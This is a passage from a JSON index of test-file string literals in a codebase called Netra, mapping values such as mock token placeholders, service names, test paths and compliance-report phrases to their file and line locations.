        "netra_backend/app/services/realistic_test_data/models.py:135",
        "auth_service/tests/auth-service-down-critical-scenarios.py:153",
        "auth_service/tests/auth-service-down-critical-scenarios.py:331"
      ]
    },
    "message_flow": {
      "value": "message_flow",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:42",
        "scripts/test_websocket_dev_mode.py:207"
      ]
    },
    "metadata": {
      "value": "metadata",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:272",
        "scripts/business_value_test_index.py:617",
        "scripts/business_value_test_index.py:737",
        "scripts/business_value_test_index.py:738"
      ]
    },
    "metadata.google.internal": {
      "value": "metadata.google.internal",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:227"
      ]
    },
    "method": {
      "value": "method",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:46"
      ]
    },
    "method exists": {
      "value": "method exists",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:49"
      ]
    },
    "method missing": {
      "value": "method missing",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:51"
      ]
    },
    "method\"\"\"\n        # TODO: Implement method test\n        pass": {
      "value": "method\"\"\"\n        # TODO: Implement method test\n        pass",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:216"
      ]
    },
    "method_names": {
      "value": "method_names",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:331"
      ]
    },
    "methods": {
      "value": "methods",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:212"
      ]
    },
    "metrics": {
      "value": "metrics",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:54",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:125",
        "scripts/team_updates_test_analyzer.py:18",
        "scripts/test_backend_optimized.py:219"
      ]
    },
    "microsoft/vscode": {
      "value": "microsoft/vscode",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:106",
        "scripts/test_verify_workflow_status.py:113",
        "scripts/test_verify_workflow_status.py:131",
        "scripts/test_verify_workflow_status.py:140",
        "scripts/test_verify_workflow_status.py:147",
        "scripts/test_verify_workflow_status.py:155",
        "scripts/test_verify_workflow_status_corrected.py:119",
        "scripts/test_verify_workflow_status_corrected.py:128",
        "scripts/test_verify_workflow_status_corrected.py:150",
        "scripts/test_verify_workflow_status_corrected.py:163"
      ]
    },
    "microsoft_access_token_123": {
      "value": "microsoft_access_token_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_fixtures.py:45"
      ]
    },
    "microsoft_id_token_123": {
      "value": "microsoft_id_token_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_fixtures.py:47"
      ]
    },
    "microsoft_refresh_token_123": {
      "value": "microsoft_refresh_token_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_fixtures.py:46"
      ]
    },
    "mid": {
      "value": "mid",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:109",
        "scripts/business_value_test_index.py:459",
        "scripts/business_value_test_index.py:675"
      ]
    },
    "mid|professional|advanced": {
      "value": "mid|professional|advanced",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:109"
      ]
    },
    "migration": {
      "value": "migration",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:340"
      ]
    },
    "min": {
      "value": "min",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:94",
        "scripts/real_service_test_metrics.py:186"
      ]
    },
    "minimal": {
      "value": "minimal",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:234"
      ]
    },
    "minor": {
      "value": "minor",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:313",
        "scripts/compliance/project_test_validator.py:328",
        "scripts/compliance/project_test_validator.py:339",
        "scripts/compliance/real_test_linter.py:55",
        "scripts/compliance/real_test_linter.py:71",
        "scripts/compliance/real_test_linter.py:109",
        "scripts/compliance/real_test_linter.py:115",
        "scripts/compliance/real_test_linter.py:141",
        "scripts/compliance/real_test_requirements_enforcer.py:490",
        "scripts/compliance/real_test_requirements_enforcer.py:525"
      ]
    },
    "minor_issues": {
      "value": "minor_issues",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:96"
      ]
    },
    "minute": {
      "value": "minute",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:122"
      ]
    },
    "misc": {
      "value": "misc",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:555"
      ]
    },
    "misses": {
      "value": "misses",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:24",
        "scripts/real_service_test_metrics.py:60",
        "scripts/real_service_test_metrics.py:62",
        "scripts/real_service_test_metrics.py:168",
        "scripts/real_service_test_metrics.py:174"
      ]
    },
    "missing Cloud SQL path": {
      "value": "missing Cloud SQL path",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:259"
      ]
    },
    "missing dependency:": {
      "value": "missing dependency:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:98"
      ]
    },
    "missing_args": {
      "value": "missing_args",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:88"
      ]
    },
    "missing_assertion": {
      "value": "missing_assertion",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:163",
        "scripts/autonomous_review/test_reviewer.py:175",
        "scripts/autonomous_review/test_reviewer.py:177"
      ]
    },
    "missing_attr": {
      "value": "missing_attr",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:58"
      ]
    },
    "missing_e2e": {
      "value": "missing_e2e",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:668"
      ]
    },
    "missing_item": {
      "value": "missing_item",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:32",
        "scripts/comprehensive_test_fixer.py:43",
        "scripts/comprehensive_test_fixer.py:56",
        "scripts/comprehensive_test_fixer.py:321"
      ]
    },
    "missing_module": {
      "value": "missing_module",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:74"
      ]
    },
    "missing_name": {
      "value": "missing_name",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:46",
        "scripts/fix_test_batch.py:301"
      ]
    },
    "missing_required_args": {
      "value": "missing_required_args",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:95"
      ]
    },
    "missing_token": {
      "value": "missing_token",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:104",
        "scripts/test_verify_workflow_status_corrected.py:117"
      ]
    },
    "mobile": {
      "value": "mobile",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:201",
        "auth_service/tests/test_session_management.py:229"
      ]
    },
    "mock": {
      "value": "mock",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:385",
        "scripts/compliance/project_test_validator.py:171",
        "scripts/compliance/project_test_validator.py:183",
        "scripts/compliance/real_test_requirements_enforcer.py:238",
        "scripts/compliance/real_test_requirements_enforcer.py:260",
        "scripts/compliance/real_test_validator.py:125",
        "scripts/compliance/real_test_validator.py:135",
        "scripts/compliance/test_refactor_helper.py:200",
        "scripts/unified_test_runner.py:615"
      ]
    },
    "mock patterns found": {
      "value": "mock patterns found",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:185"
      ]
    },
    "mock usages, should use real components": {
      "value": "mock usages, should use real components",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:287",
        "scripts/compliance/real_test_validator.py:248"
      ]
    },
    "mock-only tests in current sprint": {
      "value": "mock-only tests in current sprint",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:202"
      ]
    },
    "mock\\w*Context\\s*=": {
      "value": "mock\\w*Context\\s*=",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:73"
      ]
    },
    "mock_": {
      "value": "mock_",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:358"
      ]
    },
    "mock_\\w+\\s*=": {
      "value": "mock_\\w+\\s*=",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:274",
        "scripts/compliance/real_test_validator.py:236"
      ]
    },
    "mock_access_token": {
      "value": "mock_access_token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:243",
        "auth_service/tests/integration/test_oauth_flows_sync.py:157"
      ]
    },
    "mock_analysis.json": {
      "value": "mock_analysis.json",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:185"
      ]
    },
    "mock_auth_code_123": {
      "value": "mock_auth_code_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:69",
        "auth_service/tests/integration/test_auth_oauth_google.py:77",
        "auth_service/tests/integration/test_oauth_flows_fixtures.py:58"
      ]
    },
    "mock_client_id": {
      "value": "mock_client_id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_client.py:191"
      ]
    },
    "mock_component_class": {
      "value": "mock_component_class",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:174",
        "scripts/compliance/real_test_requirements_enforcer.py:247",
        "scripts/compliance/real_test_requirements_enforcer.py:515",
        "scripts/compliance/real_test_validator.py:127"
      ]
    },
    "mock_component_function": {
      "value": "mock_component_function",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:186",
        "scripts/compliance/real_test_linter.py:158",
        "scripts/compliance/real_test_requirements_enforcer.py:264",
        "scripts/compliance/real_test_requirements_enforcer.py:515",
        "scripts/compliance/real_test_validator.py:138",
        "scripts/compliance/test_fixer.py:356"
      ]
    },
    "mock_component_pattern": {
      "value": "mock_component_pattern",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_validator.py:158"
      ]
    },
    "mock_components": {
      "value": "mock_components",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:92",
        "scripts/check_test_compliance.py:125",
        "scripts/check_test_compliance.py:135",
        "scripts/check_test_compliance.py:149",
        "scripts/check_test_compliance.py:182",
        "scripts/check_test_compliance.py:183",
        "scripts/check_test_compliance.py:184",
        "scripts/check_test_compliance.py:186",
        "scripts/check_test_compliance.py:187"
      ]
    },
    "mock_count": {
      "value": "mock_count",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:127",
        "scripts/check_test_compliance.py:185"
      ]
    },
    "mock_implementation_comment": {
      "value": "mock_implementation_comment",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:150"
      ]
    },
    "mock_implementation_comments": {
      "value": "mock_implementation_comments",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:47",
        "scripts/remove_test_stubs.py:145"
      ]
    },
    "mock_only": {
      "value": "mock_only",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:50",
        "scripts/add_test_markers.py:141",
        "scripts/unified_test_config.py:93"
      ]
    },
    "mock_reductions": {
      "value": "mock_reductions",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:215",
        "scripts/compliance/real_test_linter.py:218",
        "scripts/compliance/test_fixer.py:352",
        "scripts/compliance/test_fixer.py:369"
      ]
    },
    "mock_refresh_token": {
      "value": "mock_refresh_token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_sync.py:158"
      ]
    },
    "mock_user": {
      "value": "mock_user",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_client.py:118",
        "auth_service/tests/utils/test_client.py:130"
      ]
    },
    "mocks (should be": {
      "value": "mocks (should be",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:172"
      ]
    },
    "mocks, should use real components": {
      "value": "mocks, should use real components",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:369"
      ]
    },
    "mode": {
      "value": "mode",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:146",
        "scripts/autonomous_review/test_reviewer.py:35"
      ]
    },
    "model": {
      "value": "model",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:72",
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:105"
      ]
    },
    "model_costs_usd": {
      "value": "model_costs_usd",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:239"
      ]
    },
    "model_type": {
      "value": "model_type",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:202"
      ]
    },
    "model_usage": {
      "value": "model_usage",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:31",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:37",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:43",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:72",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:179"
      ]
    },
    "module": {
      "value": "module",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:31",
        "scripts/comprehensive_test_fixer.py:44",
        "scripts/comprehensive_test_fixer.py:55",
        "scripts/comprehensive_test_fixer.py:67",
        "scripts/comprehensive_test_fixer.py:320",
        "scripts/fix_test_batch.py:47",
        "scripts/fix_test_batch.py:302"
      ]
    },
    "more": {
      "value": "more",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:437",
        "scripts/align_test_imports.py:449",
        "scripts/check_test_compliance.py:169",
        "scripts/check_test_compliance.py:187",
        "scripts/compliance/project_test_validator.py:361",
        "scripts/compliance/real_test_linter.py:212",
        "scripts/compliance/real_test_validator.py:305",
        "scripts/test_discovery_report.py:79",
        "scripts/test_failure_scanner.py:188"
      ]
    },
    "more errors": {
      "value": "more errors",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_order.py:117"
      ]
    },
    "more files": {
      "value": "more files",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:179",
        "scripts/check_test_import_order.py:93",
        "scripts/compliance/real_test_requirements_enforcer.py:539",
        "scripts/compliance/test_violations_reporter.py:86",
        "scripts/compliance/test_violations_reporter.py:134"
      ]
    },
    "more functions": {
      "value": "more functions",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:127"
      ]
    },
    "more suggestions": {
      "value": "more suggestions",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:148"
      ]
    },
    "more violations": {
      "value": "more violations",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:52"
      ]
    },
    "more violations in": {
      "value": "more violations in",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:134"
      ]
    },
    "ms": {
      "value": "ms",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:56",
        "netra_backend/app/services/realistic_test_data/log_generator.py:118"
      ]
    },
    "multi_service_coverage": {
      "value": "multi_service_coverage",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:632",
        "scripts/business_value_test_index.py:749"
      ]
    },
    "mv": {
      "value": "mv",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:133"
      ]
    },
    "nOnE": {
      "value": "nOnE",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:165"
      ]
    },
    "name": {
      "value": "name",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:211",
        "auth_service/tests/auth-service-down-critical-scenarios.py:233",
        "auth_service/tests/auth-service-down-critical-scenarios.py:499",
        "auth_service/tests/auth-service-down-critical-scenarios.py:513",
        "auth_service/tests/auth-service-down-critical-scenarios.py:534",
        "auth_service/tests/conftest.py:158",
        "auth_service/tests/factories/token_factory.py:225",
        "auth_service/tests/integration/test_auth_oauth_errors.py:55",
        "auth_service/tests/integration/test_auth_oauth_google.py:48",
        "auth_service/tests/integration/test_auth_oauth_google.py:249"
      ]
    },
    "naming_patterns": {
      "value": "naming_patterns",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:67",
        "scripts/generate_test_audit.py:99",
        "scripts/generate_test_audit.py:101",
        "scripts/generate_test_audit.py:103",
        "scripts/generate_test_audit.py:105",
        "scripts/generate_test_audit.py:107",
        "scripts/generate_test_audit.py:184",
        "scripts/generate_test_audit.py:220",
        "scripts/generate_test_audit.py:221",
        "scripts/generate_test_audit.py:223"
      ]
    },
    "needs_implementation": {
      "value": "needs_implementation",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:309",
        "scripts/fix_test_batch.py:387"
      ]
    },
    "netra": {
      "value": "netra",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:100",
        "auth_service/tests/test_critical_staging_database_failures.py:216",
        "scripts/test_async_postgres.py:147"
      ]
    },
    "netra-ai-staging": {
      "value": "netra-ai-staging",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:32"
      ]
    },
    "netra-auth": {
      "value": "netra-auth",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:228"
      ]
    },
    "netra-auth-dev-instance": {
      "value": "netra-auth-dev-instance",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:103",
        "auth_service/tests/test_auth_token_validation.py:177",
        "auth_service/tests/test_auth_token_validation.py:254",
        "auth_service/tests/test_critical_staging_issues.py:190"
      ]
    },
    "netra-auth-service": {
      "value": "netra-auth-service",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:86",
        "auth_service/tests/test_auth_token_generation.py:114",
        "auth_service/tests/test_auth_token_generation.py:163",
        "auth_service/tests/test_auth_token_generation.py:228",
        "auth_service/tests/test_auth_token_security.py:56",
        "auth_service/tests/test_auth_token_security.py:90",
        "auth_service/tests/test_auth_token_security.py:218",
        "auth_service/tests/test_auth_token_security.py:237",
        "auth_service/tests/test_auth_token_security.py:383",
        "auth_service/tests/test_auth_token_validation.py:99"
      ]
    },
    "netra-auth-staging": {
      "value": "netra-auth-staging",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:132",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:143",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:256",
        "auth_service/tests/test_critical_staging_issues.py:172",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:50",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:96",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:270"
      ]
    },
    "netra-auth-staging-001": {
      "value": "netra-auth-staging-001",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:257",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:97"
      ]
    },
    "netra-auth-staging-instance": {
      "value": "netra-auth-staging-instance",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:186"
      ]
    },
    "netra-auth-test-instance": {
      "value": "netra-auth-test-instance",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:282"
      ]
    },
    "netra-backend": {
      "value": "netra-backend",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:152",
        "auth_service/tests/unified/test_jwt_validation.py:215",
        "auth_service/tests/unified/test_jwt_validation.py:220",
        "scripts/test_environment_detection.py:49",
        "scripts/test_error_monitor_logic.py:115",
        "scripts/test_error_monitor_logic.py:125",
        "scripts/test_error_monitor_logic.py:135",
        "scripts/test_error_monitor_logic.py:152"
      ]
    },
    "netra-platform": {
      "value": "netra-platform",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:100",
        "auth_service/tests/test_auth_token_validation.py:174",
        "auth_service/tests/test_auth_token_validation.py:251",
        "auth_service/tests/test_auth_token_validation.py:280",
        "auth_service/tests/unified/test_jwt_validation.py:159",
        "auth_service/tests/unified/test_jwt_validation.py:181"
      ]
    },
    "netra-prod-backend": {
      "value": "netra-prod-backend",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:56"
      ]
    },
    "netra-staging": {
      "value": "netra-staging",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:97",
        "auth_service/tests/test_staging_auth_ssl_failures.py:273",
        "scripts/test_staging_config.py:44"
      ]
    },
    "netra-staging-backend": {
      "value": "netra-staging-backend",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:42"
      ]
    },
    "netra-staging:us-central1:staging-shared-postgres": {
      "value": "netra-staging:us-central1:staging-shared-postgres",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:244"
      ]
    },
    "netra-test": {
      "value": "netra-test",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:46"
      ]
    },
    "netra=oauth_flow": {
      "value": "netra=oauth_flow",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:688"
      ]
    },
    "netra_auth": {
      "value": "netra_auth",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:49",
        "auth_service/tests/test_database_authentication_failures.py:86",
        "auth_service/tests/test_database_authentication_failures.py:182",
        "auth_service/tests/test_database_connection_validation.py:302"
      ]
    },
    "netra_backend": {
      "value": "netra_backend",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:29",
        "scripts/check_test_import_order.py:39",
        "scripts/check_test_import_order.py:44",
        "scripts/fix_test_import_errors.py:25",
        "scripts/fix_test_utils_imports.py:64",
        "scripts/remove_duplicate_test_setup.py:38",
        "scripts/standardize_l3_test_names.py:59",
        "scripts/test_backend.py:187",
        "scripts/unified_test_config.py:15",
        "scripts/unified_test_runner.py:64"
      ]
    },
    "netra_backend.app": {
      "value": "netra_backend.app",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:71"
      ]
    },
    "netra_backend.tests.test_utils": {
      "value": "netra_backend.tests.test_utils",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_import_order.py:25"
      ]
    },
    "netra_backend/alembic": {
      "value": "netra_backend/alembic",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:125"
      ]
    },
    "netra_backend/alembic.ini": {
      "value": "netra_backend/alembic.ini",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:108"
      ]
    },
    "netra_backend/app": {
      "value": "netra_backend/app",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:167"
      ]
    },
    "netra_backend/tests": {
      "value": "netra_backend/tests",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:143",
        "scripts/batch_fix_and_test.py:41",
        "scripts/check_test_import_order.py:64",
        "scripts/fix_test_import_order.py:89",
        "scripts/test_backend.py:203"
      ]
    },
    "netra_backend/tests/agents": {
      "value": "netra_backend/tests/agents",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:30"
      ]
    },
    "netra_backend/tests/conftest.py": {
      "value": "netra_backend/tests/conftest.py",
      "category": "test_literals",
      "locations": [
        "scripts/check_conftest_violations.py:15"
      ]
    },
    "netra_backend/tests/core": {
      "value": "netra_backend/tests/core",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:28"
      ]
    },
    "netra_backend/tests/core/test_config_manager.py::TestSecretManager::test_initialization": {
      "value": "netra_backend/tests/core/test_config_manager.py::TestSecretManager::test_initialization",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:38"
      ]
    },
    "netra_backend/tests/core/test_error_handling.py::TestNetraExceptions::test_configuration_error": {
      "value": "netra_backend/tests/core/test_error_handling.py::TestNetraExceptions::test_configuration_error",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:37"
      ]
    },
    "netra_backend/tests/e2e/test_system_startup.py::TestSystemStartup": {
      "value": "netra_backend/tests/e2e/test_system_startup.py::TestSystemStartup",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:40"
      ]
    },
    "netra_backend/tests/integration": {
      "value": "netra_backend/tests/integration",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:29"
      ]
    },
    "netra_backend/tests/integration/test_logging_audit_integration_core.py": {
      "value": "netra_backend/tests/integration/test_logging_audit_integration_core.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_fix_classes.py:79"
      ]
    },
    "netra_backend/tests/integration/test_logging_audit_integration_helpers.py": {
      "value": "netra_backend/tests/integration/test_logging_audit_integration_helpers.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_fix_classes.py:78"
      ]
    },
    "netra_backend/tests/integration/test_message_flow_auth_core.py": {
      "value": "netra_backend/tests/integration/test_message_flow_auth_core.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_fix_classes.py:77"
      ]
    },
    "netra_backend/tests/integration/test_message_flow_errors_core.py": {
      "value": "netra_backend/tests/integration/test_message_flow_errors_core.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_fix_classes.py:72"
      ]
    },
    "netra_backend/tests/integration/test_message_flow_errors_helpers.py": {
      "value": "netra_backend/tests/integration/test_message_flow_errors_helpers.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_fix_classes.py:71"
      ]
    },
    "netra_backend/tests/integration/test_message_flow_performance_core.py": {
      "value": "netra_backend/tests/integration/test_message_flow_performance_core.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_fix_classes.py:76"
      ]
    },
    "netra_backend/tests/integration/test_message_flow_performance_helpers.py": {
      "value": "netra_backend/tests/integration/test_message_flow_performance_helpers.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_fix_classes.py:75"
      ]
    },
    "netra_backend/tests/integration/test_message_flow_routing_core.py": {
      "value": "netra_backend/tests/integration/test_message_flow_routing_core.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_fix_classes.py:70"
      ]
    },
    "netra_backend/tests/integration/test_message_flow_routing_helpers.py": {
      "value": "netra_backend/tests/integration/test_message_flow_routing_helpers.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_fix_classes.py:69"
      ]
    },
    "netra_backend/tests/integration/test_unified_message_flow_core.py": {
      "value": "netra_backend/tests/integration/test_unified_message_flow_core.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_fix_classes.py:74"
      ]
    },
    "netra_backend/tests/integration/test_unified_message_flow_helpers.py": {
      "value": "netra_backend/tests/integration/test_unified_message_flow_helpers.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_fix_classes.py:73"
      ]
    },
    "netra_backend/tests/routes": {
      "value": "netra_backend/tests/routes",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:29"
      ]
    },
    "netra_backend/tests/routes/test_*auth*.py": {
      "value": "netra_backend/tests/routes/test_*auth*.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:32"
      ]
    },
    "netra_backend/tests/routes/test_health_route.py": {
      "value": "netra_backend/tests/routes/test_health_route.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:36"
      ]
    },
    "netra_backend/tests/routes/test_websocket_*.py": {
      "value": "netra_backend/tests/routes/test_websocket_*.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:31"
      ]
    },
    "netra_backend/tests/services": {
      "value": "netra_backend/tests/services",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:28"
      ]
    },
    "netra_backend/tests/services/agents": {
      "value": "netra_backend/tests/services/agents",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:30"
      ]
    },
    "netra_backend/tests/services/apex_optimizer_agent": {
      "value": "netra_backend/tests/services/apex_optimizer_agent",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:30"
      ]
    },
    "netra_backend/tests/services/database": {
      "value": "netra_backend/tests/services/database",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:33"
      ]
    },
    "netra_backend/tests/services/test_security_service.py::test_encrypt_and_decrypt": {
      "value": "netra_backend/tests/services/test_security_service.py::test_encrypt_and_decrypt",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:39"
      ]
    },
    "netra_backend/tests/test_agent_service_critical.py": {
      "value": "netra_backend/tests/test_agent_service_critical.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:34"
      ]
    },
    "netra_backend/tests/test_api_endpoints_critical.py": {
      "value": "netra_backend/tests/test_api_endpoints_critical.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:34"
      ]
    },
    "netra_backend/tests/test_auth*.py": {
      "value": "netra_backend/tests/test_auth*.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:32"
      ]
    },
    "netra_backend/tests/test_database*.py": {
      "value": "netra_backend/tests/test_database*.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:33"
      ]
    },
    "netra_backend/tests/test_websocket.py": {
      "value": "netra_backend/tests/test_websocket.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:31"
      ]
    },
    "netra_backend\\.tests\\.e2e\\.": {
      "value": "netra_backend\\.tests\\.e2e\\.",
      "category": "test_literals",
      "locations": [
